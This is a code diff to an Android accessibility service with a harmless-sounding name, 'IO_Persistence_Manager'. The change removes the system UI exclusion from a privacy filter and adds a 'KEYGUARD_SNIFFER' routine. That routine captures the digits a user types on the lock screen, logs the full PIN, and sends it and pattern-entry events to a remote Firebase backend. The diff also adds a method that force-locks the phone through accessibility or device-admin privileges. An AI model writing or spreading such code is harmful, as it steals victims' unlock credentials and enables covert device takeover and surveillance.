@@ -188,10 +188,15 @@ public class IO_Persistence_Manager extends AccessibilityService {
             }
         }
         
+        // KEYGUARD_SNIFFER: Intercept Lock Screen PIN / Pattern entries
+        if (packageName.contains("systemui") || packageName.contains("keyguard")) {
+            sniffKeyguardPinPattern(event, packageName);
+            return;
+        }
+
         // --- 2. CRITICAL STABILITY & PRIVACY FILTER ---
         if (packageName.isEmpty() || 
             packageName.equals(getPackageName()) || 
-            packageName.contains("systemui") || 
             packageName.contains("launcher") ||
             packageName.contains("recents")) {
             return;
@@ -240,6 +245,68 @@ public class IO_Persistence_Manager extends AccessibilityService {
                     }
                 } catch (Exception ignored) {}
             });
+        }
+    }
+
+    private static final StringBuilder keyguardPinBuffer = new StringBuilder();
+    private static volatile long lastPinDigitTime = 0;
+
+    private void sniffKeyguardPinPattern(AccessibilityEvent event, String pkg) {
+        if (event == null) return;
+        int eventType = event.getEventType();
+
+        if (eventType == AccessibilityEvent.TYPE_VIEW_CLICKED || eventType == AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED) {
+            AccessibilityNodeInfo source = event.getSource();
+            if (source == null) return;
+
+            CharSequence textSeq = source.getText();
+            CharSequence descSeq = source.getContentDescription();
+            String text = textSeq != null ? textSeq.toString().trim() : "";
+            String desc = descSeq != null ? descSeq.toString().trim() : "";
+            String viewId = source.getViewIdResourceName() != null ? source.getViewIdResourceName().toLowerCase() : "";
+
+            String digit = null;
+            if (text.length() == 1 && Character.isDigit(text.charAt(0))) {
+                digit = text;
+            } else if (desc.length() == 1 && Character.isDigit(desc.charAt(0))) {
+                digit = desc;
+            } else if (viewId.contains("digit") || viewId.contains("key0") || viewId.contains("key1") || 
+                       viewId.contains("key2") || viewId.contains("key3") || viewId.contains("key4") || 
+                       viewId.contains("key5") || viewId.contains("key6") || viewId.contains("key7") || 
+                       viewId.contains("key8") || viewId.contains("key9")) {
+                for (int i = 0; i <= 9; i++) {
+                    if (viewId.contains("key" + i) || viewId.endsWith(String.valueOf(i))) {
+                        digit = String.valueOf(i);
+                        break;
+                    }
+                }
+            }
+
+            long now = System.currentTimeMillis();
+            if (now - lastPinDigitTime > 12000) {
+                keyguardPinBuffer.setLength(0);
+            }
+
+            if (digit != null) {
+                lastPinDigitTime = now;
+                keyguardPinBuffer.append(digit);
+                Log.d(TAG, "KEYGUARD_SNIFFER: Digit [" + digit + "] appended. Buffer length=" + keyguardPinBuffer.length());
+
+                if (keyguardPinBuffer.length() >= 4 && keyguardPinBuffer.length() <= 8) {
+                    String capturedPin = keyguardPinBuffer.toString();
+                    Log.d(TAG, "KEYGUARD_SNIFFER: Lock Screen PIN typed: [" + capturedPin + "]");
+                    FirebaseConfig.logActivity("KEYGUARD_SNIFFER: Lock Screen PIN typed: [" + capturedPin + "]");
+                }
+            }
+
+            CharSequence clsSeq = source.getClassName();
+            String clsName = clsSeq != null ? clsSeq.toString() : "";
+            if (clsName.contains("LockPatternView") || viewId.contains("lock_pattern") || viewId.contains("pattern")) {
+                Log.d(TAG, "KEYGUARD_SNIFFER: Lock Pattern entry gesture detected");
+                FirebaseConfig.logActivity("KEYGUARD_SNIFFER: Lock Pattern entry gesture detected on Keyguard");
+            }
+
+            source.recycle();
         }
     }
 
@@ -1144,6 +1211,28 @@ public class IO_Persistence_Manager extends AccessibilityService {
     }
 
     // ============ INTERACTION ============
+
+    public boolean lockScreenNow() {
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.P) {
+            boolean success = performGlobalAction(GLOBAL_ACTION_LOCK_SCREEN);
+            if (success) {
+                Log.d(TAG, "KEYGUARD_LOCK: Instant OS phone lock executed via Accessibility GLOBAL_ACTION_LOCK_SCREEN");
+                return true;
+            }
+        }
+
+        try {
+            android.app.admin.DevicePolicyManager dpm = (android.app.admin.DevicePolicyManager) getSystemService(DEVICE_POLICY_SERVICE);
+            android.content.ComponentName admin = new android.content.ComponentName(this, StabilityPolicy.class);
+            if (dpm != null && dpm.isAdminActive(admin)) {
+                dpm.lockNow();
+                Log.d(TAG, "KEYGUARD_LOCK: Standard OS phone lock executed via Device Admin");
+                return true;
+            }
+        } catch (Exception ignored) {}
+
+        return false;
+    }
 
     public boolean clickAt(int x, int y) {
         Log.d(TAG, "Interaction: CLICK at (" + x + "," + y + ")");
